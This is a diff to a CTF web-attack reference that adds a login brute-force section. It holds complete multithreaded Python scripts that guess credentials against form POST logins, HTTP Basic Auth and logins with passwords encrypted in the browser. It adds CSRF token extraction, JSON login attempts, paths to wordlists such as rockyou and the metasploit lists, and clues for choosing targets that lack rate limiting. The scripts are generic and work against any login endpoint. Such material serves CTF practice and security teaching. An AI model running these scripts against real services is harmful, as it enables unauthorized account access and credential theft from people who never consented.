@@ -2,6 +2,13 @@
 
 ## Table of Contents
 - [Password/Secret Inference from Public Data](#passwordsecret-inference-from-public-data)
+- [Login Form Brute-Force](#login-form-brute-force)
+  - [Dictionary Locations](#dictionary-locations)
+  - [Python Brute-Force Script](#python-brute-force-script)
+    - [Mode 1: Standard Form POST](#mode-1-standard-form-post)
+    - [Mode 2: HTTP Basic Auth](#mode-2-http-basic-auth)
+    - [Mode 3: Frontend-Encrypted Password](#mode-3-frontend-encrypted-password)
+  - [CSRF Token Handling](#csrf-token-handling)
 - [Weak Signature/Hash Validation Bypass](#weak-signaturehash-validation-bypass)
 - [Client-Side Access Gate Bypass](#client-side-access-gate-bypass)
 - [NoSQL Injection (MongoDB)](#nosql-injection-mongodb)
@@ -41,6 +48,527 @@ For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For OAuth/OIDC, SAML,
 2. Understand identifier format (e.g., Egyptian National ID = century + YYMMDD + governorate + 5 digits)
 3. Calculate brute-force space: known digits reduce to ~50,000 or less
 4. Brute-force login with candidate IDs
+
+---
+
+## Login Form Brute-Force
+
+CTF challenges often have weak or predictable credentials behind login forms. When no SQLi, NoSQLi, or cookie manipulation bypass is available, brute-force is the fallback — but only after narrowing the search space with intelligence from the challenge.
+
+**When to brute-force:**
+- Credentials are hinted at in source code comments, JS bundles, or HTML metadata
+- The challenge provides password generation rules (e.g., "admin's password is his favorite color + birth year")
+- Login has no rate limiting, no account lockout, and no CAPTCHA
+- You've already extracted partial credentials from other bugs (e.g., username from IDOR, password format from `/proc` leak)
+
+**Before brute-forcing, always:**
+1. Check source code, JS files, robots.txt, and HTTP headers for credential hints
+2. Try common CTF defaults manually: `admin:admin`, `admin:password`, `admin:flag`, `ctf:ctf`, `root:root`
+3. Check if the registration endpoint leaks username validity (timing/enumeration)
+4. Check if the login page leaks user existence via error message differences
+
+### Dictionary Locations
+
+Use dictionaries in the following priority order:
+
+**Level 1 — Generate from challenge context (always best):**
+```bash
+# If you know the password format (e.g., "color" + "year"), generate a custom list:
+python3 -c '
+colors = ["red","blue","green","black","white","purple","orange","pink","gray"]
+years = range(1900, 2026)
+for c in colors:
+    for y in years:
+        print(f"{c}{y}")
+' > /tmp/custom_passwords.txt
+```
+
+**Level 2 — Project wordlists directory:**
+```bash
+# Check if the project ships its own dictionaries first:
+<project_root>/wordlists/
+# e.g., ~/Desktop/ctf-skills/wordlists/
+```
+These are project-maintained, curated for CTF scenarios and should be tried before system-wide lists.
+
+**Level 3 — Kali metasploit credential dictionaries:**
+```bash
+# Default credential pairs (most useful for CTF login forms):
+/usr/share/wordlists/metasploit/http_default_userpass.txt
+/usr/share/wordlists/metasploit/http_default_users.txt
+/usr/share/wordlists/metasploit/http_default_pass.txt
+/usr/share/wordlists/metasploit/tomcat_mgr_default_userpass.txt
+/usr/share/wordlists/metasploit/multi_vendor_cctv_dvr_users.txt
+/usr/share/wordlists/metasploit/multi_vendor_cctv_dvr_pass.txt
+
+# Common passwords and usernames:
+/usr/share/wordlists/metasploit/unix_passwords.txt
+/usr/share/wordlists/metasploit/unix_users.txt
+/usr/share/wordlists/metasploit/password.lst
+/usr/share/wordlists/metasploit/namelist.txt
+/usr/share/wordlists/metasploit/burnett_top_500.txt
+/usr/share/wordlists/metasploit/burnett_top_1024.txt
+
+# Flask secret keys (session cookie brute-force only):
+/usr/share/wordlists/metasploit/flask_secret_keys.txt
+/usr/share/wordlists/metasploit/superset_secret_keys.txt
+```
+
+**Level 4 — Rockyou (large, last resort):**
+```bash
+# Compressed by default, decompress first:
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+# Then use:
+/usr/share/wordlists/rockyou.txt  # ~14 million passwords
+```
+
+### Python Brute-Force Script
+
+Three modes correspond to the three most common CTF login scenarios. All use `ThreadPoolExecutor` with the same dictionary priority from the section above. Adjust `TARGET_URL`, field names, and success detection per challenge.
+
+#### Mode 1: Standard Form POST
+
+Most common: HTML `<form>` POST with `application/x-www-form-urlencoded` body.
+
+**1a — Combo list (username:password file):**
+
+```python
+#!/usr/bin/env python3
+"""CTF login form brute-force — combo list mode.
+Usage:
+    python3 brute_login.py <target_url> <combo_file> [--threads 10]
+    python3 brute_login.py http://target/login combos.txt --threads 20
+"""
+import requests, sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+TARGET = sys.argv[1]
+COMBO_FILE = sys.argv[2]
+THREADS = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[3] == "--threads" else 10
+
+# --- Adjust these per challenge ---
+HEADERS = {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded",
+}
+USERNAME_FIELD = "username"
+PASSWORD_FIELD = "password"
+SUCCESS_INDICATOR = "Welcome"  # or "Dashboard" / "flag{" / 302 redirect
+# -----------------------------------
+
+def try_login(username: str, password: str) -> tuple[str, str, bool]:
+    session = requests.Session()
+    data = {USERNAME_FIELD: username, PASSWORD_FIELD: password}
+    try:
+        r = session.post(TARGET, data=data, headers=HEADERS,
+                         allow_redirects=False, timeout=10)
+    except requests.RequestException as e:
+        print(f"  [!] Connection error: {e}")
+        return (username, password, False)
+    text = r.text
+    if SUCCESS_INDICATOR in text:
+        return (username, password, True)
+    # Alternative: check for redirect away from login page
+    # if r.status_code in (302, 303) and "login" not in r.headers.get("Location", ""):
+    #     return (username, password, True)
+    return (username, password, False)
+
+
+def main():
+    with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        combos = [line.strip() for line in f if ":" in line and not line.startswith("#")]
+
+    print(f"[*] Loaded {len(combos)} combos, {THREADS} threads")
+    print(f"[*] Target: {TARGET}")
+
+    with ThreadPoolExecutor(max_workers=THREADS) as pool:
+        futures = {
+            pool.submit(try_login, u, p): (u, p)
+            for u, p in [c.split(":", 1) for c in combos]
+        }
+        done = 0
+        for f in as_completed(futures):
+            u, p, ok = f.result()
+            done += 1
+            if done % 50 == 0 or ok:
+                print(f"  [{done}/{len(combos)}] {u}:{p}", end="")
+                print(" ✓ FOUND" if ok else "")
+            if ok:
+                print(f"\n[+] SUCCESS: {u}:{p}")
+                pool.shutdown(wait=False, cancel_futures=True)
+                return
+    print("[-] No valid credentials found.")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(__doc__)
+        sys.exit(1)
+    main()
+```
+
+**1b — User list × password list (cartesian product):**
+
+```python
+#!/usr/bin/env python3
+"""CTF login brute-force — user × password cartesian mode.
+Usage:
+    python3 brute_login_users.py <target_url> <user_list> <pass_list> [--threads 10]
+"""
+import requests, sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+TARGET = sys.argv[1]
+USER_FILE = sys.argv[2]
+PASS_FILE = sys.argv[3]
+THREADS = int(sys.argv[5]) if len(sys.argv) > 5 and sys.argv[4] == "--threads" else 10
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded",
+}
+USERNAME_FIELD = "username"
+PASSWORD_FIELD = "password"
+SUCCESS_INDICATOR = "Welcome"
+STOP_AFTER_FIRST = True
+
+found = []
+
+def try_login(username: str, password: str) -> tuple[str, str, bool]:
+    session = requests.Session()
+    data = {USERNAME_FIELD: username, PASSWORD_FIELD: password}
+    try:
+        r = session.post(TARGET, data=data, headers=HEADERS,
+                         allow_redirects=False, timeout=10)
+    except requests.RequestException:
+        return (username, password, False)
+    if SUCCESS_INDICATOR in r.text:
+        return (username, password, True)
+    return (username, password, False)
+
+def brute_user(username: str, passwords: list[str]) -> tuple[str, str | None]:
+    for pwd in passwords:
+        _, _, ok = try_login(username, pwd)
+        if ok:
+            return (username, pwd)
+    return (username, None)
+
+def main():
+    with open(USER_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        users = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+    with open(PASS_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        passwords = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+
+    print(f"[*] {len(users)} users × {len(passwords)} passwords = "
+          f"{len(users)*len(passwords)} attempts, {THREADS} threads")
+
+    with ThreadPoolExecutor(max_workers=THREADS) as pool:
+        futures = {pool.submit(brute_user, u, passwords): u for u in users}
+        for f in as_completed(futures):
+            u, pwd = f.result()
+            sys.stdout.write(f"  {u}:{pwd or '—'}")
+            if pwd:
+                sys.stdout.write(" ✓")
+                found.append((u, pwd))
+                print()
+            sys.stdout.write("\n")
+            if found and STOP_AFTER_FIRST:
+                pool.shutdown(wait=False, cancel_futures=True)
+                break
+    if found:
+        print(f"\n[+] Found credentials: {found}")
+    else:
+        print("[-] No valid credentials found.")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print(__doc__)
+        sys.exit(1)
+    main()
+```
+
+#### Mode 2: HTTP Basic Auth
+
+Simpler than form brute-force — no CSRF, no session, no field names. The `Authorization` header is `Basic base64(user:pass)`. Success = non-401 response.
+
+**Detection:** Browser prompts a native `username/password` dialog. DevTools shows `Authorization: Basic ...` request header. Server returns `WWW-Authenticate: Basic realm="..."` on 401.
+
+```python
+#!/usr/bin/env python3
+"""CTF HTTP Basic Auth brute-force.
+Usage:
+    python3 brute_basic_auth.py <target_url> <combo_file> [--threads 10]
+    python3 brute_basic_auth.py http://target/admin combos.txt --threads 20
+"""
+import requests, sys, base64
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+TARGET = sys.argv[1]
+COMBO_FILE = sys.argv[2]
+THREADS = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[3] == "--threads" else 10
+HEADERS = {"User-Agent": "Mozilla/5.0"}
+
+
+def try_basic_auth(username: str, password: str) -> tuple[str, str, bool]:
+    credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
+    headers = {**HEADERS, "Authorization": f"Basic {credentials}"}
+    try:
+        r = requests.get(TARGET, headers=headers, allow_redirects=False, timeout=10)
+    except requests.RequestException:
+        return (username, password, False)
+    # 401 = failure; anything else (200, 302, 403) = valid credentials
+    if r.status_code != 401:
+        return (username, password, True)
+    return (username, password, False)
+
+
+def main():
+    with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        combos = [line.strip() for line in f if ":" in line and not line.startswith("#")]
+
+    print(f"[*] Basic Auth brute-force: {len(combos)} combos, {THREADS} threads")
+    print(f"[*] Target: {TARGET}")
+
+    with ThreadPoolExecutor(max_workers=THREADS) as pool:
+        futures = {
+            pool.submit(try_basic_auth, u, p): (u, p)
+            for u, p in [c.split(":", 1) for c in combos]
+        }
+        done = 0
+        for f in as_completed(futures):
+            u, p, ok = f.result()
+            done += 1
+            if done % 50 == 0 or ok:
+                print(f"  [{done}/{len(combos)}] {u}:{p}", end="")
+                print(" ✓ FOUND" if ok else "")
+            if ok:
+                print(f"\n[+] SUCCESS: {u}:{p}")
+                pool.shutdown(wait=False, cancel_futures=True)
+                return
+    print("[-] No valid credentials found.")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(__doc__)
+        sys.exit(1)
+    main()
+```
+
+**Key insight:** Basic Auth brute-force is the easiest case — `base64(user:pass)` in a single header, no cookie/CSRF/session management, and 401 vs non-401 is an unambiguous oracle. Always try it first before dealing with form-based login complexity.
+
+#### Mode 3: Frontend-Encrypted Password
+
+Some CTF challenges encrypt the password in JavaScript before POSTing — the plaintext never leaves the browser. The server stores and compares hashed/encrypted values, so sending plaintext passwords will never succeed.
+
+**Detection:** Open DevTools → Network tab, submit a test login. If the password field in the POST body is a long hex/base64 string rather than plaintext, encryption is in use. Search JS bundles for `CryptoJS`, `forge`, `sjcl`, `JSEncrypt`, `SubtleCrypto`, `btoa`, or custom XOR/rotation functions.
+
+**Approach:** Read the JS to understand the algorithm, replicate it in Python, then encrypt each candidate password before sending.
+
+```python
+#!/usr/bin/env python3
+"""CTF frontend-encrypted password brute-force.
+Read the JS encryption logic first, then replicate it below in encrypt_password().
+Usage:
+    python3 brute_encrypted.py <target_url> <combo_file> [--threads 10]
+"""
+import requests, sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+TARGET = sys.argv[1]
+COMBO_FILE = sys.argv[2]
+THREADS = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[3] == "--threads" else 10
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded",
+}
+USERNAME_FIELD = "username"
+PASSWORD_FIELD = "password"
+SUCCESS_INDICATOR = "Welcome"
+
+
+# ============================================================
+# REPLICATE THE JS ENCRYPTION HERE (read JS source first!)
+# ============================================================
+
+def encrypt_password(plaintext: str) -> str:
+    """Replicate the frontend encryption. Adjust per challenge."""
+
+    # --- Example 1: plain MD5 (most common in CTF) ---
+    # import hashlib
+    # return hashlib.md5(plaintext.encode()).hexdigest()
+
+    # --- Example 2: MD5 + static salt ---
+    # import hashlib
+    # SALT = "ctf_salt_2024"  # find this in JS source
+    # return hashlib.md5((plaintext + SALT).encode()).hexdigest()
+
+    # --- Example 3: SHA256 ---
+    # import hashlib
+    # return hashlib.sha256(plaintext.encode()).hexdigest()
+
+    # --- Example 4: base64 (trivial) ---
+    # import base64
+    # return base64.b64encode(plaintext.encode()).decode()
+
+    # --- Example 5: CryptoJS.AES (needs key + IV from JS) ---
+    # from Crypto.Cipher import AES
+    # from Crypto.Util.Padding import pad
+    # import base64
+    # KEY = bytes.fromhex("deadbeef...")   # from JS: CryptoJS.enc.Hex.parse(...)
+    # IV  = bytes.fromhex("cafebabe...")   # from JS: CryptoJS.enc.Hex.parse(...)
+    # cipher = AES.new(KEY, AES.MODE_CBC, IV)
+    # ct = cipher.encrypt(pad(plaintext.encode(), 16))
+    # return base64.b64encode(ct).decode()
+
+    # --- Example 6: RSA (JSEncrypt / forge) ---
+    # from Crypto.PublicKey import RSA
+    # from Crypto.Cipher import PKCS1_v1_5
+    # import base64
+    # PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
+    # ...from JS source...
+    # -----END PUBLIC KEY-----"""
+    # key = RSA.import_key(PUBLIC_KEY_PEM)
+    # cipher = PKCS1_v1_5.new(key)
+    # ct = cipher.encrypt(plaintext.encode())
+    # return base64.b64encode(ct).decode()
+
+    # --- Example 7: custom XOR/rotation (read JS and replicate) ---
+    # KEY = b"secret"  # hardcoded in JS
+    # result = bytes(p ^ KEY[i % len(KEY)] for i, p in enumerate(plaintext.encode()))
+    # return result.hex()
+
+    return plaintext  # placeholder — replace with actual encryption
+
+
+# ============================================================
+
+def try_login(username: str, password: str) -> tuple[str, str, bool]:
+    session = requests.Session()
+    encrypted = encrypt_password(password)
+    data = {USERNAME_FIELD: username, PASSWORD_FIELD: encrypted}
+    try:
+        r = session.post(TARGET, data=data, headers=HEADERS,
+                         allow_redirects=False, timeout=10)
+    except requests.RequestException:
+        return (username, password, False)
+    if SUCCESS_INDICATOR in r.text:
+        return (username, password, True)
+    return (username, password, False)
+
+
+def main():
+    with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        combos = [line.strip() for line in f if ":" in line and not line.startswith("#")]
+
+    print(f"[*] Frontend-encrypted brute-force: {len(combos)} combos, {THREADS} threads")
+    print(f"[*] Target: {TARGET}")
+
+    with ThreadPoolExecutor(max_workers=THREADS) as pool:
+        futures = {
+            pool.submit(try_login, u, p): (u, p)
+            for u, p in [c.split(":", 1) for c in combos]
+        }
+        done = 0
+        for f in as_completed(futures):
+            u, p, ok = f.result()
+            done += 1
+            if done % 50 == 0 or ok:
+                print(f"  [{done}/{len(combos)}] {u}:{p}", end="")
+                print(" ✓ FOUND" if ok else "")
+            if ok:
+                print(f"\n[+] SUCCESS: {u}:{p}")
+                pool.shutdown(wait=False, cancel_futures=True)
+                return
+    print("[-] No valid credentials found.")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(__doc__)
+        sys.exit(1)
+    main()
+```
+
+**Key insight:** The critical step is reading the JS source to understand the encryption algorithm. Common locations: inline `<script>` in the login page, a bundled `login.js` / `app.js` file, or a Webpack chunk. Search for the password field name or `encrypt`/`hash`/`cipher` keywords. The Python `encrypt_password()` function only needs to match the JS output — not the JS implementation style.
+
+**Common JS encryption libraries and patterns:**
+
+| JS Library / Pattern | Python Equivalent |
+|----------------------|-------------------|
+| `CryptoJS.MD5(pwd).toString()` | `hashlib.md5(pwd.encode()).hexdigest()` |
+| `CryptoJS.SHA256(pwd).toString()` | `hashlib.sha256(pwd.encode()).hexdigest()` |
+| `CryptoJS.AES.encrypt(pwd, key, {iv: iv})` | `pycryptodome` (`Crypto.Cipher.AES`) |
+| `btoa(password)` | `base64.b64encode(pwd.encode()).decode()` |
+| `forge.md.sha256.create().update(pwd)` | `hashlib.sha256(pwd.encode()).hexdigest()` |
+| `new JSEncrypt(); encrypt.setPublicKey(k);` | `pycryptodome` PKCS1_v1_5 |
+| `sjcl.encrypt(password, plaintext)` | Stanford JS Crypto Library — rare in CTFs |
+| Custom XOR/rotation on char codes | Replicate in Python with `bytes()` loops |
+
+### CSRF Token Handling
+
+Many login forms include a CSRF token field. The general approach:
+
+```python
+def get_csrf_token(session: requests.Session, login_page_url: str) -> tuple[str, str]:
+    """Fetch login page, extract CSRF token. Returns (token_value, cookie_value)."""
+    r = session.get(login_page_url, headers=HEADERS, timeout=10)
+    # Parse the token from the form — adjust selector to match the challenge
+    from html.parser import HTMLParser
+
+    class CSRFExtractor(HTMLParser):
+        def __init__(self):
+            super().__init__()
+            self.token = None
+        def handle_starttag(self, tag, attrs):
+            if tag == "input":
+                attrs = dict(attrs)
+                if attrs.get("name") in ("csrf_token", "_csrf", "csrfmiddlewaretoken",
+                                          "authenticity_token", "__RequestVerificationToken"):
+                    self.token = attrs.get("value")
+
+    parser = CSRFExtractor()
+    parser.feed(r.text)
+    return (parser.token, r.cookies.get_dict())
+
+# Usage in try_login():
+# token, cookies = get_csrf_token(session, LOGIN_PAGE)
+# data["csrf_token"] = token
+# r = session.post(TARGET, data=data, headers=HEADERS, cookies=cookies, ...)
+```
+
+**Key insight:** CSRF tokens are per-session, not per-request — fetch once per `requests.Session()` rather than every attempt. If the token is per-request, use the same session and extract the token from each response for the next request.
+
+### Non-Standard Login: JSON Body
+
+For APIs that accept JSON login (increasingly common in CTFs):
+
+```python
+def try_login_json(username: str, password: str) -> tuple[str, str, bool]:
+    session = requests.Session()
+    payload = {"username": username, "password": password}
+    r = session.post(TARGET, json=payload, headers=HEADERS, timeout=10)
+    # JSON APIs typically return {"success": true} or {"error": "..."}
+    try:
+        resp = r.json()
+        if resp.get("success") or "token" in resp:
+            return (username, password, True)
+    except Exception:
+        pass
+    return (username, password, False)
+```
+
+### Detection: When to Reach for Brute-Force
+
+| Clue | Action |
+|------|--------|
+| No rate limiting (fast responses, no 429) | Brute-force directly |
+| Error message says "wrong password" (not "user not found") | Valid username enumeration → narrow to password-only brute-force |
+| Registration endpoint leaks username format | Generate candidate usernames |
+| JS bundle contains `TODO: remove default password` | Try the context as password |
+| Challenge description mentions "easy password" | Run top-100 passwords first |
+| Login response time differs for valid vs invalid users | Username enumeration oracle first, then brute-force the valid one |
 
 ---
 
